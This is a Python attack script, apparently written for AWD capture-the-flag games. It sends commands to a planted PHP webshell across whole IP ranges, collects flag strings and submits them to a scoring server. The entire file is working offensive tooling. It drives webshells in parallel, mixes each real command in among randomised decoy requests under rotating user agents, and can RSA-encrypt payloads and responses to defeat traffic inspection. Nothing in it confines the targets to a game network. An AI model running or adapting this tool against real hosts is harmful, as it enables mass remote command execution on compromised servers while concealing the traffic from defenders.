#!/usr/bin/env python3
"""
AWD 混淆流量攻击模块
支持: 普通批量 / 混淆流量 / RSA加密 / 混淆+RSA组合
"""
import requests, threading, random, string, hashlib, time, json, os, re, sys
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime

sys.path.insert(0, os.path.dirname(__file__))
from rsa_crypto import rsa_encrypt, rsa_decrypt, RSAAgentClient, load_keys

FLAG_PATTERN = re.compile(r'flag\{[^}]+\}', re.I)
KNOWN_FILE = os.path.join(os.path.dirname(__file__), 'known_flags.json')

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0",
]


class MixAttack:
    def __init__(self, targets, shell_url='/shell.php', shell_pass='cmd',
                 threads=20, timeout=5, proxy=None, no_submit=False,
                 submit_url=None, token=None, use_rsa=False, rsa_agent=None,
                 mix_mode=False, fake_count=8):
        self.targets = targets if isinstance(targets, list) else [targets]
        self.shell_url = shell_url
        self.shell_pass = shell_pass
        self.threads = threads
        self.timeout = timeout
        self.proxy = proxy
        self.no_submit = no_submit
        self.submit_url = submit_url
        self.token = token
        self.use_rsa = use_rsa
        self.mix_mode = mix_mode
        self.fake_count = fake_count
        self.known = set()
        self.lock = threading.Lock()
        self.total_submitted = 0
        self.running = True
        self.session = requests.Session()
        self.session.headers.update({'User-Agent': random.choice(USER_AGENTS)})
        if proxy:
            self.session.proxies.update({'http': proxy, 'https': proxy})
        if use_rsa:
            self.rsa = RSAAgentClient(rsa_agent)
        self.load_known()

    def load_known(self):
        if os.path.exists(KNOWN_FILE):
            with open(KNOWN_FILE) as f:
                self.known = set(json.load(f))

    def save_known(self):
        tmp = KNOWN_FILE + '.tmp'
        with open(tmp, 'w') as f:
            json.dump(list(self.known), f)
        os.replace(tmp, KNOWN_FILE)

    def log(self, msg, level='INFO'):
        ts = datetime.now().strftime('%H:%M:%S')
        print(f'[{ts}] [{level}] {msg}')

    def extract_flags(self, text):
        return FLAG_PATTERN.findall(text)

    def rand_str(self, n=8):
        return ''.join(random.choices(string.ascii_letters + string.digits, k=n))

    def submit_flag(self, flag, ip):
        if flag in self.known:
            return False
        if self.no_submit or not self.submit_url:
            self.log(f'[发现] {ip} → {flag}', 'FLAG')
            with self.lock:
                self.known.add(flag)
            return True
        try:
            r = self.session.post(self.submit_url,
                data={'flag': flag, 'token': self.token or ''}, timeout=10)
            self.log(f'[提交] {flag} → {r.text.strip()[:40]}', 'SUBMIT')
            with self.lock:
                self.known.add(flag)
                self.total_submitted += 1
            self.save_known()
            return True
        except Exception as e:
            self.log(f'[提交失败] {flag}: {e}', 'ERROR')
            return False

    def attack_one(self, ip, cmds):
        ip = ip.strip()
        proto = 'https' if self.args and getattr(self.args, 'https', False) else 'http'
        port = f':{self.args.port}' if hasattr(self, 'args') and self.args and getattr(self.args, 'port', 80) != 80 else ''
        base = f'{proto}://{ip}{port}'
        found = False
        url = base + self.shell_url
        for cmd in cmds:
            try:
                if self.use_rsa:
                    payload = self.rsa.encrypt_payload(cmd)
                    r = self.session.post(url, data={'d': payload}, timeout=self.timeout)
                    if r.status_code == 200 and r.text.strip():
                        plain = self.rsa.decrypt_response(r.text.strip())
                        for flag in self.extract_flags(plain):
                            if flag not in self.known:
                                self.submit_flag(flag, ip)
                                found = True
                else:
                    r = self.session.post(url, data={self.shell_pass: cmd}, timeout=self.timeout)
                    if r.status_code == 200:
                        for flag in self.extract_flags(r.text):
                            if flag not in self.known:
                                self.submit_flag(flag, ip)
                                found = True
            except Exception:
                pass
            if not self.running:
                break
        return found

    def _mix_request(self, url, passwd, real_cmd):
        """万假一真"""
        for i in range(self.fake_count):
            if not self.running:
                return None
            is_real = (i == self.fake_count - 1)
            if is_real:
                data = {passwd: real_cmd}
            elif i % 2 == 0:
                data = {passwd: 'echo ' + self.rand_str(12)}
            else:
                data = {self.rand_str(4): self.rand_str(16)}
            hdrs = {'User-Agent': random.choice(USER_AGENTS)}
            try:
                self.session.post(url, data=data, headers=hdrs, timeout=self.timeout/2)
            except Exception:
                pass
        return None

    def mix_attack_one(self, ip, cmds):
        ip = ip.strip()
        proto = 'https' if hasattr(self, 'args') and self.args and getattr(self.args, 'https', False) else 'http'
        port = f':{self.args.port}' if hasattr(self, 'args') and self.args and getattr(self.args, 'port', 80) != 80 else ''
        base = f'{proto}://{ip}{port}'
        url = base + self.shell_url
        found = False
        for cmd in cmds:
            if self.use_rsa:
                enc_cmd = self.rsa.encrypt_payload(cmd)
                self._mix_request(url, 'd', enc_cmd)
                try:
                    r = self.session.post(url, data={'d': enc_cmd}, timeout=self.timeout)
                    if r.status_code == 200 and r.text.strip():
                        plain = self.rsa.decrypt_response(r.text.strip())
                        for flag in self.extract_flags(plain):
                            if flag not in self.known:
                                self.submit_flag(flag, ip)
                                found = True
                except Exception:
                    pass
            else:
                self._mix_request(url, self.shell_pass, cmd)
                try:
                    r = self.session.post(url, data={self.shell_pass: cmd}, timeout=self.timeout)
                    if r.status_code == 200:
                        for flag in self.extract_flags(r.text):
                            if flag not in self.known:
                                self.submit_flag(flag, ip)
                                found = True
                except Exception:
                    pass
        return found

    def run_batch(self, cmds, mix_only=False):
        self.log(f'目标: {len(self.targets)} | 线程: {self.threads}')
        self.log(f'模式: {"Mix+" if self.mix_mode else ""}{"RSA" if self.use_rsa else "Normal"}')
        found_any = False
        attack_fn = self.mix_attack_one if (self.mix_mode or mix_only) else self.attack_one
        with ThreadPoolExecutor(max_workers=self.threads) as ex:
            fs = {ex.submit(attack_fn, t, cmds): t for t in self.targets}
            for f in as_completed(fs):
                if f.result():
                    found_any = True
        return found_any

    def run_loop(self, cmds, interval=30):
        round_num = 0
        self.log(f'轮询间隔: {interval}s | 模式: {"Mix+" if self.mix_mode else ""}{"RSA" if self.use_rsa else "Normal"}')
        try:
            while self.running:
                round_num += 1
                start = time.time()
                self.log(f'── 第 {round_num} 轮 ──')
                self.run_batch(cmds)
                self.log(f'耗时: {time.time()-start:.1f}s | 累计提交: {self.total_submitted}')
                time.sleep(interval)
        except KeyboardInterrupt:
            self.log('用户中断')
        self.save_known()
        self.log(f'共提交 {self.total_submitted} 个Flag')


def main():
    import argparse
    parser = argparse.ArgumentParser(description='AWD 混淆流量攻击')
    parser.add_argument('--ip', help='目标IP/CIDR逗号分隔')
    parser.add_argument('--ip-list', help='IP列表文件')
    parser.add_argument('--shell-url', default='/shell.php')
    parser.add_argument('--pass', dest='shell_pass', default='cmd')
    parser.add_argument('-c', '--cmd', nargs='+', default=['cat /flag'])
    parser.add_argument('--port', type=int, default=80)
    parser.add_argument('--https', action='store_true')
    parser.add_argument('--submit-url', help='裁判机')
    parser.add_argument('--token', help='提交Token')
    parser.add_argument('--no-submit', action='store_true')
    parser.add_argument('--threads', type=int, default=20)
    parser.add_argument('--timeout', type=int, default=5)
    parser.add_argument('--interval', type=int, default=30)
    parser.add_argument('--proxy', help='HTTP代理')
    parser.add_argument('--rsa', action='store_true', help='启用RSA加密通信')
    parser.add_argument('--rsa-agent', help='RSA Agent URL (默认本地密钥)')
    parser.add_argument('--mix', action='store_true', help='启用混淆流量')
    parser.add_argument('--fake-count', type=int, default=8, help='每个真请求前混淆请求数')
    parser.add_argument('--once', action='store_true', help='单轮不轮询')
    args = parser.parse_args()

    targets = set()
    if args.ip:
        import ipaddress
        for cidr in args.ip.split(','):
            try:
                for h in ipaddress.ip_network(cidr.strip(), strict=False).hosts():
                    targets.add(str(h))
            except:
                targets.add(cidr.strip())
    if args.ip_list:
        with open(args.ip_list) as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith('#'):
                    targets.add(line)

    if not targets:
        parser.error('必须指定 --ip 或 --ip-list')

    ma = MixAttack(list(targets), args.shell_url, args.shell_pass,
                   args.threads, args.timeout, args.proxy, args.no_submit,
                   args.submit_url, args.token, args.rsa, args.rsa_agent,
                   args.mix, args.fake_count)
    ma.args = args

    if args.once:
        ma.run_batch(args.cmd)
    else:
        ma.run_loop(args.cmd, args.interval)


if __name__ == '__main__':
    main()
